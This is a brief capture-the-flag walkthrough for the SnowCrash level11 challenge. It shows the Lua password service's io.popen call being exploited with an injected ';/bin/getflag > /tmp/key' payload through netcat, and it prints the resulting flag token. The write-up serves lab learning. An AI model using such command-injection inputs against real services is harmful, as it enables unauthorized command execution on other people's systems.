### Exploit

Yet another programming language to exploit. This time around let's have a look at what the script does first. We're meant to connect as 127.0.0.1:5151, an address which is already in use. Launch netstat just to make sure...

```
    level11@SnowCrash:~$ netstat -ltnp
    (No info could be read for "-p": geteuid()=2011 but you should be root.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
    tcp6       0      0 :::4646                 :::*                    LISTEN      -
    tcp6       0      0 :::4747                 :::*                    LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::4242                 :::*                    LISTEN      -
```
Through netcat, as we connect to said address, a prompt for a password comes up. We expected to write a password in, which'll be hashed by the function "hash". Notice the function calls __io.popen__. Now all we have to do is inject some [os command injection](http://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities).

```
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: ;/bin/getflag > /tmp/key
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/key
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
Only a couple more left!
